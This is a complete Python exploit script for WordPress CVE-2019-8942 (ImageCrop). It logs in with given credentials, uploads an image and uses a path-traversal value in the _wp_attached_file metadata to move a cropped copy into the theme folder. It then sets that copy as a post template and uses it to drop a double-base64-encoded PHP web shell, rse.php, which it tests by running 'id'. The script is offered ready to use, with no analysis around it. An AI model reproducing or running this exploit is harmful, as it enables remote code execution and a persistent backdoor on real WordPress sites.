import base64
import requests
import argparse
import re
from datetime import datetime


class Wordpress():
    def __init__(self,target,username,password,theme):
        self.target = target
        self.username = username
        self.password = password
        self.theme = theme
        self.date = str(datetime.now().strftime('%Y'))+'/'+str(datetime.now().strftime('%m'))+'/'
        self.image = 'rse.jpg'
        self.payload = self.encoding() 
        self.session = requests.Session()
        
        self.url = self.check_url()
        self.admin_login()
        self.wp_nonce = self.getwp_nonce()
        self.image_id, self.image_nonce = self.image_upload()
        self.path_traversal()
        self.a_nonce = self.ajax_nonce()
        self.image_crop()
        self.new_post()

    def check_url(self):
        check = self.target[-1]
        if check == "/":
            return self.target
        else:
            fixed_url = self.target + "/"
            return fixed_url

    def encoding(self):
        initial_string = "<?php system($_REQUEST[0]); ?>"
        sample_string_bytes = initial_string.encode("ascii")
          
        base64_bytes = base64.b64encode(sample_string_bytes)
        
        second_string = base64_bytes.decode("ascii")
        sample_string_bytes = second_string.encode("ascii")
          
        base64_bytes = base64.b64encode(sample_string_bytes)
        base64_string = base64_bytes.decode("ascii")

        return base64_string
    
    def admin_login(self):
        print("Login in")
        login_data = {
            'log':self.username,
            'pwd':self.password,
            'wp-submit':'Log In',
            'redirect_to':self.url+'wp-admin/',
            'testcookie':1
        }

        login_req = self.session.post(self.url+'wp-login.php',data=login_data)
        admin_req = self.session.get(self.url + 'wp-admin/')
        if 'Dashboard' in admin_req.text:
            print("Login successful!\n")
        else:
            print("Failed to login.")
            exit()

    def getwp_nonce(self):
        print("Getting Wp Nonce")

        nonce_req = self.session.get(self.url+'wp-admin/media-new.php')
        wp_nonce_list = re.findall(r'name="_wpnonce" value="(\w+)"',nonce_req.text)

        if len(wp_nonce_list) == 0 :
            print("Failed to retrieve the _wpnonce :( \n")
            exit()
        else :
            wp_nonce = wp_nonce_list[0]
            print("Wp Nonce retrieved successfully ! _wpnonce: " + wp_nonce+"\n")
            return wp_nonce

    def image_upload(self):
        print("Uploading the image")

        image_data = {
            'name': 'rse.jpg',
            'action': 'upload-attachment',
            '_wpnonce': self.wp_nonce
        }

        image = {'async-upload': (self.image, open(self.image, 'rb'))}
        upload_req = self.session.post(self.url+'wp-admin/async-upload.php', data=image_data, files=image)
        if upload_req.status_code == 200:
            image_id = re.findall(r'{"id":(\d+),',upload_req.text)[0]
            image_nonce = re.findall(r'"update":"(\w+)"',upload_req.text)[0]
            print('Image uploaded successfully with Image ID: '+ image_id+"\n")
            return image_id, image_nonce
        else : 
            print("Failed to receive a response for uploaded image! Try again.\n")
            exit()

    def path_traversal(self):
        print("Changing the path")
        path_data = {
            '_wpnonce':self.image_nonce,
            'action':'editpost',
            'post_ID':self.image_id,
            'meta_input[_wp_attached_file]':self.date+self.image+'?/../../../../themes/' + self.theme+'/rse'
        }

        path_req = self.session.post(self.url+'wp-admin/post.php',data=path_data)
        if path_req.status_code == 200:
            print("Path has been changed successfully!\n")
        else :
            print("Failed to change the path! Make sure the theme is correct.\n")
            exit()

    def ajax_nonce(self):
        print("Getting Ajax nonce")
        ajax_data = {
            'action':'query-attachments',
            'post_id':0,
            'query[item]':43,
            'query[orderby]':'date',
            'query[order]':'DESC',
            'query[posts_per_page]':40,
            'query[paged]':1
        }

        ajax_req = self.session.post(self.url+'wp-admin/admin-ajax.php',data=ajax_data)
        ajax_nonce_list=re.findall(r',"edit":"(\w+)"',ajax_req.text)

        if ajax_req.status_code == 200 and len(ajax_nonce_list) != 0 :
            ajax_nonce = ajax_nonce_list[0]
            print('Ajax Nonce retrieved successfully ! ajax_nonce: '+ ajax_nonce+'\n')
            return ajax_nonce
        else :
            print("Failed to retrieve ajax_nonce :(\n")
            exit()

    def image_crop(self):
        print("Cropping the uploaded image")
        crop_data = {
            'action':'crop-image',
            '_ajax_nonce':self.a_nonce,
            'id':self.image_id,
            'cropDetails[x1]': 0,
            'cropDetails[y1]':0,
            'cropDetails[width]':400,
            'cropDetails[height]':300,
            'cropDetails[dst_width]':400,
            'cropDetails[dst_height]':300
        }

        crop_req = self.session.post(self.url+'wp-admin/admin-ajax.php',data=crop_data)
        if crop_req.status_code == 200:
            print("Done!\n")
        else :
            print("Error! Try again.\n")
            exit()

    def new_post(self):
        print("Creating a new post to include the image")
        new_post_req = self.session.post(self.url+'wp-admin/post-new.php')
        if new_post_req.status_code == 200:
            _wpnonce = re.findall(r'name="_wpnonce" value="(\w+)"',new_post_req.text)[0]
            post_id = re.findall(r'"post":{"id":(\w+),',new_post_req.text)[0]
            print("Post created successfully!\n")
        else :
            print("Error! Try again.\n")
            exit()

        post_data={
            '_wpnonce':_wpnonce,
            'action':'editpost',
            'post_ID':post_id,
            'post_title':'RSE',
            'visibility':'public',
            'publish':'Publish',
            'meta_input[_wp_page_template]':'cropped-rse.jpg'
        }

        post_req = self.session.post(self.url+'wp-admin/post.php',data=post_data)
        if post_req.status_code == 200:
            print("Dropping Backdoor rse.php")
            requests.get(self.url + "?p=" + post_id + "&0=echo%20" + self.payload + "%20|%20base64%20-d%20|%20base64%20-d%20>%20rse.php")
            print("Backdoor URL: " + self.url + "rse.php\n")
            payload_url = requests.get(self.url + "rse.php?0=id")
            print("Example Payload: " + payload_url.url + "\n" + payload_url.text)
        else :
            print("Error! Try again (maybe change the payload)\n")
            exit()

if __name__ == "__main__":
    print("WordPress ImageCrop CVE 2019-8942\n")
    parser = argparse.ArgumentParser(description='WordPress ImageCrop CVE 2019-8942')

    parser.add_argument('-t', metavar='<Target URL>', help='target/host URL, E.G: -t http://wordpress.rce/', required=True)
    parser.add_argument('-u', metavar='<Username>',help="Example: -u username", required=True)
    parser.add_argument('-p', metavar='<Password>',help="Example: -p password", required=True)
    parser.add_argument('-m', metavar='<Theme>',help="Example: -m twentytwenty", required=True)

    args = parser.parse_args()

    try:
        Wordpress(args.t,args.u,args.p,args.m)
    except KeyboardInterrupt:
        print("Bye Bye")
        exit()